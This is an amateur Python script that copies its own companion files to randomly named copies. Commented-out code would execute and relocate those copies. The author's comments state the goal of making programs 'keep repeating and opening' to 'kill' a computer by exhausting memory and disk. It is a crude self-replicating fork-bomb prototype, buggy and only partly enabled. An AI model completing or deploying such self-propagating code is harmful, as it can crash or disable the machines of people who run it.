import shutil
import random
import subprocess
from subprocess import call
from pathlib import Path
import os

eg = 0
cdir = os.getcwd()

def makeandtake():
  eg =+ 1 
  ea = str(random.randint(0,10000000))
  source_file = open('main.py', 'rb')
  destination_file = open(("main"+ ea +".py"), 'wb')
  shutil.copyfileobj(source_file, destination_file)
  destination_file.close()
  #subprocess.call("main"+ ea + ".py" , shell=True)
  #shutil.move(("main"+ ea + ".py" ), os.path.dirname(cdir))

def makeandtake2():
  ea4 = str(random.randint(0,10000000))
  source_file = open('main2.py', 'rb')
  destination_file = open(("main4324325"+ea4+".py"), 'wb')
  shutil.copyfileobj(source_file, destination_file)
  destination_file.close()
  #subprocess.call("main4324325"+ea4+".py" , shell=True)
  #shutil.move(("main4324325"+ea4+".py" ), os.path.dirname(cdir))


#write to closed file error
#no such file or directory, cannot open main432.py
#current test to move
if 1==1:
  makeandtake()
  makeandtake2()
#^ makes it so i can call it again but from a different location 

#if premissions are denied on C:/ don't use this.
#shutil.move(("main"+ ea + ".py"), 'C:/Users'))

# python is ez to kill with. programs keep repeating and opening. use a browser that takes up a lot of memory

#make it copy to a different destination / make it save to the main drive and keep opening
